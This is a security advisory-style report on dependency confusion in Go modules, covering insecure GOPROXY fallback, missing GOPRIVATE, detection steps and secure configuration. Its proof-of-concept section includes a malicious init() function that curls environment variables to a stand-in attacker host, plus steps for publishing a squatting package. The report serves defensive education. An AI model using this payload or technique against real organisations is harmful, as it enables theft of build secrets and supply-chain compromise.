### **Vulnerability Report: Dependency Confusion via Go Modules**

**1. Vulnerability Title**

Dependency Confusion via Go Modules Leading to Remote Code Execution

**2. Severity Rating**

**Overall Severity: High🟠**

This vulnerability allows for a supply chain attack that can result in Remote Code Execution (RCE) on developer machines and in CI/CD build environments. The ease of exploitation depends on a common misconfiguration, and the impact is a full compromise of the build environment. This typically warrants a CVSS score in the **8.0-9.8** range (High to Critical).

**3. Description**

Dependency confusion is a supply chain attack where an attacker registers a package on a public repository (like the public Go Module Index) with the same name as a private, internal package used by a target organization. If the Go development or CI/CD environment is not configured securely, the `go` command can be tricked into downloading and using the malicious public package instead of the intended private one. This allows the attacker to execute arbitrary code within the trusted environment.

**4. Technical Description (for security pros)**

The Go module system uses the `GOPROXY` environment variable to determine where to download module source code. This variable can contain a comma-separated list of proxy URLs. The `go` command will try each URL in order until it successfully downloads the module.

The vulnerability arises from an insecure `GOPROXY` configuration, such as:
`GOPROXY=https://private.proxy.corp,https://proxy.golang.org,direct`

In this scenario, if a developer tries to fetch `internal.corp/pkg/auth`, the `go` command first queries the private proxy. If the private proxy returns a "not found" error (e.g., HTTP 404), the `go` command proceeds to the next entry, `proxy.golang.org`. An attacker who has discovered the internal package name can upload a malicious package with the same name to the public repository. The public proxy will find this malicious package, and the `go` command will download it.

The attack is particularly effective if the malicious public package has a higher version number than the private one, as package managers often prefer the latest version. Once downloaded, any malicious code in the package's `init()` functions will be executed automatically during the build process.

**5. Common Mistakes That Cause This**

  * **Insecure `GOPROXY` Fallback:** Configuring `GOPROXY` to fall back to a public proxy (`proxy.golang.org`) after an internal one.
  * **Missing or Incomplete `GOPRIVATE` Configuration:** Not setting the `GOPRIVATE` environment variable. This variable is crucial as it tells the `go` command which modules are private and should *never* be requested from a public proxy or checked against the public checksum database (`sum.golang.org`).
  * **Leaking Internal Module Names:** Internal module paths being exposed publicly through source code on GitHub, error messages, or developer forum posts, which allows an attacker to know which package names to target.

**6. Exploitation Goals**

The primary goal is **Remote Code Execution (RCE)**. By injecting malicious code into an `init()` function within the fake public package, an attacker can:

  * Steal credentials, API keys, and other secrets from the developer machine or CI/CD environment.
  * Establish a reverse shell for persistent access.
  * Tamper with the build process to inject backdoors into the final application artifacts.
  * Move laterally across the organization's internal network.

**7. Affected Components or Files**

  * **Build Environment:** Developer workstations and CI/CD runners where `go get`, `go build`, or `go mod tidy` commands are executed.
  * **`go.mod` file:** Defines the dependencies. A vulnerable build process will cause this file to point to the malicious public version.
  * **`go.sum` file:** Contains checksums for dependencies. The `go` command will report a checksum mismatch when it downloads the new malicious package, but a developer or automated process might be tricked into updating it with the new, malicious checksum.

**8. Vulnerable Code Snippet**

The vulnerability is not in the Go code itself, but in the environment configuration.

**Vulnerable `go.mod`:**

```go
module my.corp/main-app

go 1.21

require (
    // This is a private module that also exists on a public repository
    "internal.corp/pkg/auth" v1.2.0
)
```

**Vulnerable Environment Configuration:**

```bash
# This configuration tells the 'go' tool to try the public proxy if the private one fails.
export GOPROXY="https://private.proxy.corp,https://proxy.golang.org"

# GOPRIVATE is not set, so the 'go' tool doesn't know that "internal.corp/pkg/auth"
# should be treated as exclusively private.
export GOPRIVATE=""
```

**9. Detection Steps**

1.  **Audit Go Environment Variables:** Check the configuration of `GOPROXY`, `GOPRIVATE`, `GONOPROXY`, and `GONOSUMDB` on all developer machines and CI/CD pipelines. Ensure `GOPROXY` does not contain public fallbacks for private modules.
2.  **Monitor Proxy Logs:** Check your internal Go proxy logs for HTTP 404/410 "Not Found" errors for your internal package paths. A high volume of these errors could indicate that the `go` tool is attempting to find them externally.
3.  **Scan for Publicly Registered Private Names:** Periodically check public repositories like `proxy.golang.org` to see if any of your internal module names have been registered.
4.  **Use `go list`:** After a build, use `go list -m all` to inspect the actual source of each dependency and verify that private packages are being fetched from the correct internal location.

**10. Proof of Concept (PoC)**

1.  **Identify Target:** An attacker discovers a private Go module name, `internal.corp/pkg/utils`, from a public code snippet.
2.  **Create Malicious Package:** The attacker creates a new Go module with the same name and places a malicious payload in an `init()` function.
    ```go
    // Malicious package: internal.corp/pkg/utils/utils.go
    package utils

    import "os/exec"

    func init() {
        // Simple payload to demonstrate RCE
        exec.Command("/bin/bash", "-c", "curl http://attacker.com/steal?data=$(env)").Run()
    }
    ```
3.  **Publish Malicious Package:** The attacker publishes this module to a public repository (e.g., GitHub) and tags it with a high version number, like `v1.99.0`. The public Go proxy will eventually index it.
4.  **Trigger the Attack:** A developer at the target company, with a misconfigured environment (`GOPROXY` with a public fallback and no `GOPRIVATE`), runs `go get -u` or `go mod tidy`.
5.  **Exploitation:** The `go` command, failing to find `v1.99.0` on the private proxy, queries the public proxy, finds the malicious version, and downloads it. The next `go build` or `go test` command will execute the `init()` function, and the attacker's payload runs.

**11. Risk Classification**

  * **CWE-427: Uncontrolled Search Path Element:** This is a primary classification, as the Go module resolution path (`GOPROXY`) includes an uncontrolled public repository.
  * **CWE-829: Inclusion of Functionality from Untrusted Control Sphere:** The build process is tricked into including and executing a malicious component from an untrusted public source.

**12. Fix & Patch Guidance**

The vulnerability is in the environment's configuration, not Go itself. The fix is to enforce a strict separation between private and public dependencies.

1.  **Configure `GOPRIVATE`:** This is the most critical step. Set `GOPRIVATE` to a comma-separated list of glob patterns for all your internal module paths. This tells the `go` tool to *never* use a proxy or checksum database for these modules.
    ```bash
    # Example: Mark all modules under internal.corp and git.corp as private
    export GOPRIVATE="internal.corp/*,git.corp/*"
    ```
2.  **Configure `GOPROXY` Securely:** Set `GOPROXY` to point *only* to your trusted internal proxy/repository. Do not include public proxies like `proxy.golang.org` in the same list.
    ```bash
    # Only use the internal proxy
    export GOPROXY="https://private.proxy.corp"
    ```
    If you need to access public packages, your internal proxy should be configured to safely fetch and cache them.
3.  **Use `GONOPROXY` and `GONOSUMDB`:** These are automatically set by `GOPRIVATE` but can be configured independently for more granular control. `GONOPROXY` is a list of modules to fetch directly (e.g., from Git), and `GONOSUMDB` is a list to exclude from checksum verification against public databases.

**Recommended Secure Configuration:**

```bash
# Set your private module prefixes
export GOPRIVATE="internal.corp/*"

# Set your proxy to an internal repository ONLY
export GOPROXY="https://artifactory.corp/goproxy"

# Explicitly ensure private modules are not sent to the checksum database
export GONOSUMDB="internal.corp/*"
```

**13. Scope and Impact**

  * **Scope:** Any organization developing with Go that uses private modules and does not enforce a strict and secure dependency resolution configuration across all developer and CI/CD environments.
  * **Impact:** A successful attack has a high impact, as it can lead to a full compromise of the build environment. This can result in the theft of sensitive data and source code, or the injection of malware into production applications, turning a single build machine compromise into a widespread software supply chain incident.

**14. Remediation Recommendation**

  * **Centralized Configuration:** Enforce a secure Go environment configuration across your organization using pre-configured development environments, CI/CD templates, or base container images.
  * **Use a Repository Manager:** Employ a repository manager (like JFrog Artifactory, Sonatype Nexus, etc.) as your single `GOPROXY`. This manager can serve your private modules and securely proxy/cache public modules, giving you a single, controlled entry point for all dependencies.
  * **Developer Education:** Train developers on the risks of dependency confusion and the importance of using the correct `GOPRIVATE` and `GOPROXY` settings.
  * **Reserve Public Namespaces:** If possible, register your organization's name or key private package names on public repositories to prevent an attacker from squatting on them.

**15. Summary**

Dependency confusion in Go modules is a high-impact supply chain vulnerability caused by improperly configured environments that mix private and public package sources. Attackers can exploit this by publishing a malicious public package with the same name as an internal one, tricking the `go` tool into downloading and executing it. This can lead to remote code execution. Mitigation requires strict configuration of the `GOPRIVATE` and `GOPROXY` environment variables to ensure that private dependencies are never sought in public repositories.

**16. References**

  * [Go Documentation: Private Modules](https://www.google.com/search?q=https://go.dev/ref/mod%23private-modules)
  * [Go Documentation: `GOPROXY` environment variable](https://www.google.com/search?q=%5Bhttps://go.dev/ref/mod%23goproxy-environment-variable%5D\(https://go.dev/ref/mod%23goproxy-environment-variable\))
  * [Original Dependency Confusion Research by Alex Birsan](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)
  * [OWASP - CICD-SEC-03: Dependency Chain Abuse](https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-03-Dependency-Chain-Abuse)
  * [CWE-427: Uncontrolled Search Path Element](https://cwe.mitre.org/data/definitions/427.html)